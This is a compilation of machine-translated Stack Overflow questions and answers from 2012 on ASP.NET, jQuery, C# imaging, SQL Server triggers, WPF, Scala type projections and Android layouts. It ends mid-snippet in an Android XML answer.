`string _timeSpentinMin="123"; Page page = HttpContext.Current.CurrentHandler as Page; ScriptManager.RegisterStartupScript(page, page.GetType(), "OpenModalDialog", "<script type=text/javascript>window.showModalDialog('ClockPopUP.aspx', null, 'dialogWidth:290px;dialogHeight:270px;status:no'); </script>", false);`

我还想将查询字符串传递给 Clock.aspx 并从 javascript 我这样做：-

```
function openmodalWinLunch() {
            var variable1 = "Lunch";
            window.showModalDialog("ClockPopUP.aspx?code=" + variable1, "dialogWidth:290px;dialogHeight:270px,");
        } 
```

我的问题是我们将如何从后面的 asp 代码中做同样的事情。请按照上面提到的更新我的 ASp.Net 代码以满足我的需求。我想使用 showmodalDialog 将字符串变量 _timespentinMin 从查询字符串传递到 Clock.aspx 页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T05:53:12.323

```
Session["TaskActiveNonProd"] = isAnyNonProdTaskActive;
Page page = HttpContext.Current.CurrentHandler as Page;
ScriptManager.RegisterStartupScript(page, page.GetType(), "OpenModalDialog", "<script type=text/javascript>window.showModalDialog('ElapsedClockNonProd.aspx?code=" + isAnyNonProdTaskActive.ToString() + "', null, 'dialogWidth:290px;dialogHeight:270px;status:no'); </script>", false); 
```

# jquery - Spring MVC 2.5 异常处理显示错误弹出同一页面

> ID：11427815
> 
> 赞同：0
> 
> 时间：2012-07-11T07:39:04.907
> 
> 标签：jquery, spring-mvc, exception-handling, popup

我正在寻找在 MVC Spring 项目中管理已检查和未检查异常的方法。最后显示一个带有消息错误的弹出窗口。

我知道如何使用 SimpleMappingExceptionResolver 将流程重定向到错误页面。但我需要保持在同一页面上，只用 jquery 显示弹出窗口。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-18T15:48:56.343

您可以捕获异常（例如在您的解析器中）并将错误消息添加到用户会话。比你创建控制器，它从用户会话中获取消息并在响应中返回它。在客户端，您轮询此控制器并显示消息。

# javascript - 文本框和选择框在单个文本中组合值（第一个 tb 值，然后是 sb 值）

> ID：11427819
> 
> 赞同：0
> 
> 时间：2012-07-11T07:39:17.110
> 
> 标签：javascript, jquery

我想在单个文本中显示文本框和选择框组合值（第一个 tb 值，然后是 sb 值）。这是jsp页面：

```
<table>
<tr>
<td>A : </td>
<td><input type="text" id="text1" name="customer" value=""></td>
</tr>
<tr><td>B :</td></tr>
<tr>
<td><input type="radio" onclick="change(this, 'select1000')" name="license[1]" value="1000"> 25-1000</td>
<td><div id="select1000" style="display: none">
<select id="select" name="selectbox">    
<option test="l25" value="25">25</option>
<option test="l100" value="100">100</option>
<option test="l175" value="175">175</option>
<option test="l250" value="250">250</option>
<option test="l325" value="325">325</option>
</select>
</div>
</td>
</tr>
<tr><td> ShowValue: </td>
<td><input type="text" name="key" id="text2" value="" disabled="disabled"></td> </tr>
</table> 
```

我想在 ShowValuetextbox 中显示文本框 A 和选择框值 B（第一个 textbx 值出现然后选择框），为此我编写了 jquery：

```
<script type="text/javascript">
$("#text1").keyup(function() {
$("#text2").val($("#text1").val() + $(this).find('option:selected').val()).change();
});

$("#select").keyup(function(){
$("#text2").val($("#text1").val() + $(this).find('option:selected').val()).change();
});
</script> 
```

没有得到预期的输出，任何输入的家伙........

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:50:24.123

伙计：在代码中有一个小错误。用这个替换它。

```
<script type="text/javascript">
$("#text1").keyup(function() {
$("#text2").val($("#text1").val() + $("#select").find('option:selected').val()).change();
});

$("#select").change(function(){
$("#text2").val($("#text1").val() + $(this).find('option:selected').val()).change();
});
</script> 
```

您为文本 2 调用 .change() 事件是否有任何特殊原因？您也可以简单地使用 $("#select").val(); 获取下拉列表的选定值

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:52:30.037

```
<script type="text/javascript">

    $(document).ready(function(){    

        $('#text1').keyup(function() {
             $('#text2').val($(this).val()+$('#select').val());
        });

    });
</script> 
```

这对我有用，我试图把它放在 jsfiddle 中，但它对我来说是失败的。你也应该使用 document.ready 来确保事件正确绑定

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T08:55:37.560

```
var sel = $("#select"),
    txt_1 = $("#text1"),
    txt_2 = $("#text2");

txt_1.on('keyup', function() {
    txt_2.val( $.trim( this.value ) + sel.val() );
});

sel.on('change', function() {
    txt_2.val( $.trim( txt_1.val() ) + this.value );
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-11T09:48:08.497

感谢大家分享您的意见，但我已经写了这个（虽然在 textbox2 中显示了评论）但这对我有用：

```
 <script type="text/javascript">
   $(document).ready(function(){
  $("#text1").keyup(function(){
//   $("#text2").val($("#text1").val());
   $("#text2").val($("#text1").val() + $(this).find('option:selected').val()).change();
  });
});

     $(document).ready(function(){
  $('select[name="selectbox"]').change(function() {
    var selectedValue = $(this).find('option:selected').val();
    $('input[name="key"]').val(selectedValue);
    $("#text2").val($("#text1").val() + $(this).find('option:selected').val()).change();
  });

});
 </script> 
```

# xpages - 从 xp:callback 中删除 html 输出

> ID：11427825
> 
> 赞同：2
> 
> 时间：2012-07-11T07:39:47.233
> 
> 标签：xpages

我有包含一些操作按钮的自定义控件。有些是应用程序范围的，有些是特定页面的。正在使用可编辑区域添加特定按钮（

有没有办法删除这个生成 div 标签或者我应该只是忍受它并更改一些 css 代码;）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-12T14:58:11.897

实际上，您可以通过删除`id`属性并将其设置`disableTheme`为`true`for来删除生成的 div 标签`xp:callback`。所以它看起来像这样：

`<xp:callback facetName="facet_2" disableTheme="true"></xp:callback>`

# c# - 在 C# 中插入图像、灰度和擦除过渡

> ID：11427826
> 
> 赞同：0
> 
> 时间：2012-07-11T07:39:48.753
> 
> 标签：c#, windows

我已经用c#开发了一个windows应用程序这个应用程序有三个按钮（打开，保存，灰度），并有图片框来显示应用程序中的图片

```
 using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Drawing.Imaging;

namespace MyFirstWindowsApplication
{
    public partial class Form1 : Form
    {
        Bitmap newbitmap;
        Bitmap newbitmap2;
        Bitmap outp;
        Image file;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult dr = openFileDialog1.ShowDialog();

            if (dr == DialogResult.OK)
            {
                file = Image.FromFile(openFileDialog1.FileName);
                newbitmap = new Bitmap(openFileDialog1.FileName);
                newbitmap2 = new Bitmap(openFileDialog1.FileName);
                outp = new Bitmap(openFileDialog1.FileName);
                pictureBox1.Image = file;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            DialogResult dr = saveFileDialog1.ShowDialog();
            if (dr == DialogResult.OK)
            {
                if (newbitmap != null)
                {
                    if (saveFileDialog1.FileName.Substring(saveFileDialog1.FileName.Length - 3).ToLower() == "bmp")
                    {
                        newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Bmp);
                    }

                    if (saveFileDialog1.FileName.Substring(saveFileDialog1.FileName.Length - 3).ToLower() == "jpg")
                    {
                        newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Bmp);
                    }

                    if (saveFileDialog1.FileName.Substring(saveFileDialog1.FileName.Length - 3).ToLower() == "bmp")
                    {
                        newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Jpeg);
                    }

                    if (saveFileDialog1.FileName.Substring(saveFileDialog1.FileName.Length - 4).ToLower() == "jpeg")
                    {
                        newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Jpeg);
                    }

                    if (saveFileDialog1.FileName.Substring(saveFileDialog1.FileName.Length - 3).ToLower() == "png")
                    {
                        newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Png);
                    }

                    if (saveFileDialog1.FileName.Substring(saveFileDialog1.FileName.Length - 3).ToLower() == "gif")
                    {
                        newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Gif);
                    }
                }
                else
                {
                    MessageBox.Show("you need to open file first");
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

            for (int x = 0; x < newbitmap.Width; x++)
            {
                for (int y = 0; y < newbitmap.Height; y++)
                {
                    Color originalColor = newbitmap.GetPixel(x, y);
                    int grayscale = (int)((originalColor.R * .3) + (originalColor.G * .59) + (originalColor.B * .11));
                    Color newColor = Color.FromArgb(grayscale, grayscale, grayscale);
                    newbitmap.SetPixel(x, y, newColor);
                }

            }

            int tmax = 10;
            int xmax=newbitmap.Width;
            int ymax=newbitmap.Height;
            for (int t = 0; t <= tmax; t += 1)
            {

                for (int x = 0; x < xmax; x++)
                {
                    for (int y = 0; y < ymax; y++)
                    {
                        if ((x / xmax) > (t / tmax))
                        {
                            Color originalco = newbitmap2.GetPixel(x, y);
                            outp.SetPixel(x, y, originalco);
                        }
                        else
                        {
                            Color originalco3 = newbitmap.GetPixel(x, y); ;
                            outp.SetPixel(x, y, originalco3);
                        }
                        pictureBox1.Image = outp;
                    }

                }
            }

        }
    }
} 
```

问题是没有进行擦除过渡

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:50:58.290

要制作灰度图像，请考虑使用这个更好的解决方案

```
public Image MakeGrayscale(Image original)
{
    Image newBitmap = new Bitmap(original.Width, original.Height);
    Graphics g = Graphics.FromImage(newBitmap);
    ColorMatrix colorMatrix = new ColorMatrix(
       new float[][] 
        {
            new float[] {0.299f, 0.299f, 0.299f, 0, 0},
            new float[] {0.587f, 0.587f, 0.587f, 0, 0},
            new float[] {.114f, .114f, .114f, 0, 0},
            new float[] {0, 0, 0, 1, 0},
            new float[] {0, 0, 0, 0, 1}
        });

    ImageAttributes attributes = new ImageAttributes();
    attributes.SetColorMatrix(colorMatrix);
    g.DrawImage(original, new Rectangle(0, 0, original.Width, original.Height),
       0, 0, original.Width, original.Height, GraphicsUnit.Pixel, attributes);

    g.Dispose();
    return newBitmap;
} 
```

接着

```
pictureBox1.Image = MakeGrayscale(newbitmap); 
```

即使在保存例程中，您也有一些错误。尝试这个：

```
private void button2_Click(object sender, EventArgs e)
{
    if (newbitmap == null)
    {
        MessageBox.Show("you need to open file first");
        return;
    }

    if (DialogResult dr = saveFileDialog1.ShowDialog() == DialogResult.OK)
    {
        string ext = Path.GetExtension(saveFileDialog1.FileName).ToLower();
        switch (ext)
        {
            case ".bmp": 
                newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Bmp); 
                break;
            case ".jpg": 
            case ".jpeg": 
                newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Jpeg); 
                break;
            case ".png": 
                newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Png); 
                break;
            case ".gif": 
                newbitmap.Save(saveFileDialog1.FileName, ImageFormat.Gif); 
                break;
            default: MessageBox.Show("Extension not supported");
        }
    }
} 
```

在我看来，转换不起作用是因为这个原因：你的主线程（GUI 一个可以理解）在一个循环中快速（非常快）改变图片框图像，但是在这个循环中它没有时间更新 GUI，所以图片框被有效地改变了只退出循环..所以你看不到转换。
您应该使用 BackgroundWorker 来更改图片框图像（在每个循环之间暂停，让人眼看到新图像）。

# javascript - Javascript验证表单不会阻止提交

> ID：11427827
> 
> 赞同：0
> 
> 时间：2012-07-11T07:39:55.763
> 
> 标签：javascript, forms, javascript-events

我有一个表单，我在提交时执行 javascript 验证功能：

```
 <form method="post" onsubmit="return validateForm(this.id)" action="<?php echo $PHP_SELF; ?>" enctype="multipart/form-data" id='addjournalinfoform' style='border:0px;width:90%' class="formular" >

            <fieldset>
                <legend>
                Journal
                </legend>
                <label>
                    <span>* ISSN:</span><br />
                    <input type='text' onfocusout="validateField('issn')" class='text-input' value="" name="issn" id="issn" style='width:30%'>
                </label>
           </fieldset>

       </form> 
```

这是功能：

```
function validateForm(form)
{
    if(form=="addjournalinfoform")
    {
        alert('onSubmit');
        if($('#issn').val()=="")
        {
            $('#issnMsg').hide(500);
            $('#issnMsg .formErrorContent').html("* This field is required!<br />");
            $('#issnMsg').css('margin-left', $('#'+field).width()-20);
            $('#issnMsg').show(500);
            $('#issn').focus();
            $('html:not(:animated),body:not(:animated)').animate({scrollTop: $('#issn').offset().top-50}, 0);
            return false;
        }
        else
        {
            return true;
        }

    }
    return false;
} 
```

问题是即使函数返回 false，表单仍然被提交。做错了什么？以及如何防止提交？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T07:41:09.880

在这一行：

```
$('#issnMsg').css('margin-left', $('#'+field).width()-20); 
```

变量`field`未定义。

> 未捕获的 ReferenceError：未定义字段

**您必须学习如何调试您自己的应用程序**，因为没有它您不会走得太远。阅读有关在您使用的任何浏览器中使用控制台的信息。

[您可以在此 Webmasters.SE 问题](https://webmasters.stackexchange.com/questions/8525/how-to-open-the-javascript-console-in-different-browsers)中找到有关在浏览器中打开控制台的信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-11T07:45:16.777

打开控制台（firebug、chrome、opera、ie9 都有）。检查执行 validateForm() 时是否没有错误。

我猜是否有错误：

```
 $('#issnMsg').css('margin-left', $('#'+field).width()-20); 
```

有一个错误：

```
 Uncaught ReferenceError: field is not defined 
```

你有声明`field`变量吗？

# android - PhoneGap 插件不工作

> ID：11427828
> 
> 赞同：1
> 
> 时间：2012-07-11T07:40:02.430
> 
> 标签：android, html, cordova, phonegap-plugins

我正在我的代码中尝试 Android 应用程序的 PhoneGap 插件。我的 HTML Strict 4 代码如下

**代码：**

```
<!DOCTYPE html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no;" />
<meta http-equiv="Content-type" content="text/html; charset=utf-8">
<script type="text/javascript" charset="utf-8" src="phonegap-1.0.0.js"></script>
<script type="text/javascript" charset="utf-8" src="system.js"></script>
<script type="text/javascript">

var uname;

function validate(){    

    //uname = document.forms[0].elements[0].value;
    //var pass = document.forms[0].elements[1].value;

    uname=document.getElementById("i1").value;
    var pass=document.getElementById("i2").value;

    alert("Uname: "+uname+"\r\nPass: "+pass);

    if(!uname || uname === "" || !pass || pass === ""){

        alert("User Credentials are incorrect");

    }
    else{           

        //Make a webservice call
          post_data(uname,pass,postDataCB);     

    }

}

function postDataCB(retval){

    alert("In postDataCB()\r\nuname: "+uname);

}

</script>
</head>
<body>
   <form>
      User name: <input type="text" id="i1" name="username" value="GEO02-OTPUAT" /><br />
      Password:&nbsp;&nbsp;<input type="password" id="i2" name="pwd" value="aaa111" /><br />
      <button onclick="javascript:validate()">Submit</button><br />
  </form> 
```

在我的 HTML 中，我有一个名为`uname`. 这个变量在回调函数中使用`postDataCB()`，但它是未定义的。（我确实注意到并看到了）我观察到的是，当我`<form />` 从 HTML 代码中删除元素时，它似乎起作用了。

那么任何人都可以告诉我为什么会发生这种情况以及如何解决这个问题。

**post_data的代码：**

```
public PluginResult post_data(JSONArray funcargs, String jscallbackid){

    SuccessCallBack=funcargs.getString(0);
    FailureCallBack=funcargs.getString(1);
        uname= funcargs.getString(2);
    passw = funcargs.getString(3);      

    conn = new URL("http://www.subratlogin.com/login").openConnection();
    conn.setDoOutput(true);

    data += URLEncoder.encode(uname, "UTF-8") + "=" + URLEncoder.encode(passw, "UTF-8") + "&";

    //remove the unwanted & at the end of the string
    data = data.substring(0,data.length()-1);  

    ro = new OutputStreamWriter(conn.getOutputStream());
    ro.write(data);

    //Close the connection
    ro.close(); 

    try{

        rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));

        while ((line = rd.readLine()) != null)
        {
           sb.append(line);
        }

    //Close the connection
       rd.close();

    } catch (IOException e) {
        SendJS = "javascript:" + FailureCallBack + "('" + e.getMessage() + "')"; 
        sendJavascript(SendJS);
        return null;
    }

    SendJS = "javascript:" + SuccessCallBack + "('" + JSONObject.quote(sb.toString()); 

    if(jObj != null)
        SendJS += "','" +  jObj + "')";
    else if(StringParam != null)
        SendJS += "','" + StringParam + "')";
    else
        SendJS += "')";

    sendJavascript(SendJS);
    return null;    
 } 
```

sry fr 问这种类型的问题。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-11T12:09:10.097

您根本没有遵循插件规范，而且我没有看到您为 deviceready 设置侦听器的任何地方。

[http://wiki.phonegap.com/w/page/36753494/How%20to%20Create%20a%20PhoneGap%20Plugin%20for%20Android](http://wiki.phonegap.com/w/page/36753494/How%20to%20Create%20a%20PhoneGap%20Plugin%20for%20Android)

# sql - 更改发生后具有新 ID 的 SQL 复制行

> ID：11427843
> 
> 赞同：0
> 
> 时间：2012-07-11T07:41:22.590
> 
> 标签：sql, sql-server, sql-server-2008

您好，我有一个如下所示的 SQL 表：

```
ID      BEZEICHNUNG  PREIS        UPDATE_DATE          FLAG

1       Drake        Room         14.06.2012 16:00     0
2       Blazer       BS           12.05.2012 14:45     0 
```

当我更改一个值时，我想复制具有新 id 的行并将标志更改为 1，它应该如下所示：

```
ID      BEZEICHNUNG  PREIS        UPDATE_DATE          FLAG

1       Drake        Room         11.07.2012 09:40     1
2       Blazer       BS           12.05.2012 14:45     0
3       Dune         Room         11.07.2012 09:40     0 
```

当我更改行时，update_date 会自行更新并将标志设置为 1。如何创建这样的 sql 语句。

当前触发器如下所示：

```
ALTER TRIGGER [dbo].[UPDT_DIENSTLEISTUNG]
   ON [dbo].[DIENSTLEISTUNG]
   AFTER INSERT, UPDATE
AS
BEGIN

   SET  NOCOUNT ON;

   UPDATE DIENSTLEISTUNG
      SET UPDATE_DATE    = getdate ()
    WHERE id IN (SELECT id
                   FROM inserted);

END; 
```

在此先感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T09:05:33.163

请先创建此触发器，然后尝试更新表

```
CREATE TRIGGER [dbo].[UPDT_DIENSTLEISTUNG]
   ON [dbo].[DIENSTLEISTUNG]
   AFTER  UPDATE
AS

BEGIN
 SET  NOCOUNT ON;

DECLARE @MAX_ID INT;
SELECT @MAX_ID=MAX(ID) FROM DIENSTLEISTUNG;

declare @tmp Table(ID  int,     BEZEICHNUNG varchar(20), PREIS varchar(20),
     UPDATE_DATE datetime,      FLAG bit)

insert into @tmp
select ID,BEZEICHNUNG,PREIS,UPDATE_DATE,1 [flag] from deleted;

delete T from DIENSTLEISTUNG T JOIN @tmp I
ON T.ID=I.ID

INSERT INTO DIENSTLEISTUNG
SELECT @MAX_ID+ROW_NUMBER() OVER(ORDER BY ID) [ID],BEZEICHNUNG,PREIS,GETDATE(),0 
FROM INSERTED

INSERT INTO DIENSTLEISTUNG
select * from @tmp

 SET  NOCOUNT OFF;
END; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-11T07:49:06.857

一种选择（更新原始行，但插入历史行）是使用类似于此的 SQL：

```
create table MyTab
(
    [id] int primary key identity,
    [name] varchar(50),
    [type] varchar(50),
    [flag] bit default 0
)

insert into MyTab([name], [type])
    Values('Drake', 'Room')
insert into MyTab([name], [type])
    Values('Blazer', 'BS')

select * from myTab

Update MyTab
    Set name = name + 'new'
Output deleted.name, deleted.type, 1
into myTab(name, type, flag)
Where name = 'Drake'

select * from myTab 
```

# c# - WPF 中重 UI 控件的平滑调整大小行为

> ID：11427849
> 
> 赞同：0
> 
> 时间：2012-07-11T07:41:55.527
> 
> 标签：c#, .net, wpf

我在 WPF 中开发了一个用于制图的控件，但是在调整控件大小时出现了性能问题。由于我不知道如何使性能更好，所以我现在只是在增大时关闭了渲染，但这看起来不太好。所以我的问题是是否可以在调整大小期间将控件“冻结”为图像以使其看起来平滑。

**编辑：**该控件基本上由一个滚动查看器组成，其中包含一个自定义虚拟化面板。scrollviewer 只能水平滚动。滚动查看器中的虚拟化面板包含所有其他项目，例如曲线、标签、网格等。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T23:44:29.210

这是一个很好的建议列表：

[解决 WPF 应用程序的性能问题](https://stackoverflow.com/questions/9822166/solve-performance-issue-with-wpf-application)

另外尝试：

ScrollViewer 上的 IsDeferredScrollingEnabled="true"。

仅当您有 ScrollViewer.CanContentScroll=true 时才启用 UI 虚拟化

[WPF 中的 ListBox、VirtualizingStackPanel 和平滑滚动](https://stackoverflow.com/questions/1924089/listbox-virtualizingstackpanel-and-smooth-scrolling-in-wpf)

允许基于像素的滚动并进行虚拟化的 hacky 解决方法：

[带有 ListBox 的 WPF ListBox - UI 虚拟化和滚动](https://stackoverflow.com/questions/1977929/wpf-listbox-with-a-listbox-ui-virtualization-and-scrolling/9875475#9875475)

UI 虚拟化的一些细节：

[http://bea.stollnitz.com/blog/?p=338](http://bea.stollnitz.com/blog/?p=338)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-24T13:14:13.107

这个答案显然为时已晚，但可能对未来的探索者有所帮助！

如果您想在繁忙的控件上平滑地调整内容的大小，则此答案可能无效。但是，如果您想在重新调整大小期间解决口吃问题，那么在重新调整大小开始之前执行此操作。

1.  [在图像中捕获当前](https://stackoverflow.com/questions/2522380/get-a-bitmap-image-from-a-control-view)屏幕内容
2.  将上面图像的 Recangle 叠加层作为背景。
3.  将控件的可见性设置为隐藏/折叠

当重新调整大小完成时。

1.  将控件的可见性设置为可见
2.  等待布局改变（即控件布局）
3.  现在隐藏矩形覆盖。

这对于控件来说效果很好，但是如果您调整窗口大小，它仍然会导致卡顿。

# c# - 在 GridView 的选定行中显示按钮并将其隐藏在未选定的行中

> ID：11427854
> 
> 赞同：1
> 
> 时间：2012-07-11T07:42:12.367
> 
> 标签：c#, asp.net, button, gridview

我有一个按钮，`GridView`我只想在选定的行上启用它，当我选择一个新的行时，前一行的按钮应该是不可见的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:49:49.693

您可以使用`GridView's` [`SelectedIndexChanged`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.selectedindexchanged%28v=vs.80%29.aspx)事件循环所有行并找到您的按钮。如果它是`SelectedRow`显示它的按钮，则隐藏它们：

```
protected void GridView1_SelectedIndexChanged(Object sender, EventArgs e)
{
    var grid = (GridView)sender;
    foreach (GridViewRow row in grid.Rows)
    {
        var btn = (Button)row.FindControl("Button1");
        // Compare this row with the currently selected row using the SelectedRow property
        // SelectedRow might be null, the logic would work anyway
        btn.Visible = row == grid.SelectedRow;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:47:13.803

您可以通过启用 GridView.SelectedIndexChanged 事件中的按钮来实现此目的

但是要禁用前一行按钮，如果按钮不在选定的行中，您将不得不迭代并禁用它们

# jquery - 重定向后在目标页面上显示通知

> ID：11427859
> 
> 赞同：5
> 
> 时间：2012-07-11T07:42:22.750
> 
> 标签：jquery, ajax, redirect, notifications

假设我在`add-project.html`页面上有一个表单。请求完成后，我将用户重定向回`index.html`主页。

我想要做的是`index.html` **仅**在用户成功提交表单时才显示通知。

我正在使用此插件进行通知：[http ://redeyeoperations.com/plugins/Notify/](http://redeyeoperations.com/plugins/Notify/)

现在，我正在使用一个临时解决方案，它`add-project.html`会在提交表单时显示通知，然后在 a 之后重定向到`index.html`主页，`setTimeout`但我不喜欢它，它很脏。

```
$('#printForm').submit(function(e) {
    e.preventDefault();
    $.ajax({
        type: 'POST',
        url: 'add-project.php',
        data: $('#printForm').serialize(),
        success: function(result) {
            if(result == '1') {
                // Success
                $.notify.basic('Congratulations, your projet has been saved correctly', {
                    occupySpace : true,
                    close : true,
                    autoClose: 5000
                });

                setTimeout(function() {
                    window.location.href = '../index.html';
                }, 2000);
            }
            else {
                // Error
                $.notify.error('Oops, something went wrong ! Make sure you filled all the necessary fields', {
                    occupySpace : true,
                    close : true,
                    autoClose: 5000
                });
            }
        }
    });         
}); 
```

重定向后是否有一种干净的方法可以在目标页面上显示通知？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T07:51:41.320

index.html 需要某种方式来知道表单已发送。您可以通过使用 url 参数或哈希并使用 js 读取它来做到这一点。

```
//after submit
window.location.href = '../index.html#success';

//in index.html
if(window.location.hash == '#success')
{
    //show the notification
} 
```

# php - 使用 jQuery 和 PHP 使用动态显示/隐藏表单编辑数据

> ID：11427860
> 
> 赞同：0
> 
> 时间：2012-07-11T07:42:33.390
> 
> 标签：php, jquery, forms

我是 jQuery 新手，学得很快，但我真的需要帮助。

我有一个包含像这个例子这样的数据的页面：

该页面有一个名为**“内容”**（id）的潜水

此 div 包含 2 个子 div：一个用于数据，一个用于表单，分别称为**div-data**和**div-form**。

![在此处输入图像描述](../Images/d1150e02139b6871ab78cdfa766cc14b.png)

最初，“div-data”被显示，另一个被隐藏。

当我单击编辑时，“div-data”消失，“div-form”出现填充形式的数据。

我进行了数据验证，一切都很好，编辑后的数据在 DB 上更新，所以我必须隐藏“div-form”并显示“div-form”，但问题是，“div-data”中的数据没有更新。

我该怎么做才能更新那个div？？？

我在最后一步：/

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:54:06.700

那是事实 ！因为您在**#div-form / input**而不是**#div-data**中更新数据，所以在隐藏**#div-form**并显示**#div-data**之后，您会看到存储在**#div-data中的****旧**数据。

 **解决办法太多了，我给大家挑一个简单的（伪代码，未经测试）：

向这两个地方添加一些通用类。

```
var $div_data_cache = $('#div-data');

$('#div-form input').each(function() {
    var className = $(this).attr('className');

    $div_data_cache.find(className).html( $(this).val() )            
}); 
```

这样，在按下“ok”后，这个脚本将帮助你在彼此之间同步数据。

注意：如果你不太关心跨浏览器的问题，可以使用 HTML5 中引入的新属性**contenteditable**

**现在，您可以为#div-data**中的所有子div 设置此属性，并设置一些事件以在完成编辑后触发validations/db 操作！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:47:42.323

您已经在一个单独的元素中获得了值，您可以替换其内容。

然后您可以从 ajax 成功函数中填充这些元素：

```
success: function(data){
    $('#div-data').find('.firstname').text(data.firstname).end()
        .find('.lastname').text(data.lastname).end()
        .find('.work').text(data.work);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:58:07.507

为什么不切换表单输入字段上的禁用选项？这样，您的 DOM 中只需要一个 div 并且您不必关心 DOM 操作。

这就是我所说的：

假设您的 EDIT 按钮的 id 是“form-edit”：

```
$('#form-edit').click(function(){
    $('#div-form').find('input ').each(function(){
        $this = $(this);
        if ($this.attr('disabled')) $this.removeAttr('disabled');
                else $this.attr('disabled', 'disabled');
    });
}); 
```

[http://www.w3schools.com/tags/att_option_disabled.asp](http://www.w3schools.com/tags/att_option_disabled.asp)**

# scala - 类型参数中的“#”是什么意思？

> ID：11427864
> 
> 赞同：5
> 
> 时间：2012-07-11T07:42:40.047
> 
> 标签：scala, type-parameter

> **可能重复：**
> [为什么选择 Scala 类型成员时使用散列而不是点？](https://stackoverflow.com/questions/6676048/why-does-one-select-scala-type-members-with-a-hash-instead-of-a-dot)

我有时会看到一个类型参数，例如：

```
class Test[K] {
  type T = Foo[K#Bar]
} 
```

有人可以解释一下这个类型参数中的“#”是什么意思吗？这是某种限制`K`吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T08:46:19.817

不，# 是类型投影。但是，在您的情况下，这不起作用，因为 K 没有定义任何 BAR 类型。

```
trait A  { 
           type T 
           def apply():T 
}

trait MyClass[X<:A] { 
               type SomeType = X#T 
               def applySeq():Traversable[SomeType] 
}

class AImpl extends A { 
      type T=Int 
      def apply():Int = 10
}

class MyClassImpl extends MyClass[AImpl] {
         def applySeq(): Traversable[SomeType] = List(10)
} 
```

这基本上让您可以在 MyClass 中使用 A 中的类型 T 。

其实也可以如下编译：

```
class MyClassImpl extends MyClass[AImpl] {def applySeq(): Traversable[Int] = List(10)} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T10:15:18.257

'#' 用于投影出包含在另一种类型中的类型。请参阅问题[“为什么选择 Scala 类型成员时使用散列而不是点”的](https://stackoverflow.com/questions/6676048/why-does-one-select-scala-type-members-with-a-hash-instead-of-a-dot)[答案](https://stackoverflow.com/a/6676210/402428)？

# android - Android：相对布局，在底部放一个元素

> ID：11427869
> 
> 赞同：5
> 
> 时间：2012-07-11T07:42:56.953
> 
> 标签：android, android-relativelayout

你好我有这个布局：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >
<ImageView
    android:src="@drawable/head"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_gravity="top"
    android:id="@+id/image1"
     />
<Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:background="@drawable/scan"
    android:text=""
    android:layout_below="@+id/image1" />
<LinearLayout
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:id="@+id/mio_ad">
</LinearLayout>
</RelativeLayout> 
```

我无法将我的#mio_ad 放在底部：它仍然在顶部。我怎样才能？谢谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-07-11T07:45:02.707

```
android:layout_alignParentBottom="true" 
```

用它！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-11T07:49:22.277

为此，请使用以下 XML 代码，它可能会对您有所帮助。

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >
    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:id="@+id/llayout" 
        android:layout_above="@+id/mio_ad">
        <ImageView
            android:src="@drawable/head"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="top"
            android:id="@+id/image1"/>
        <Button
            android:id="@+id/button1"
            android:layout_width="wrap_content"
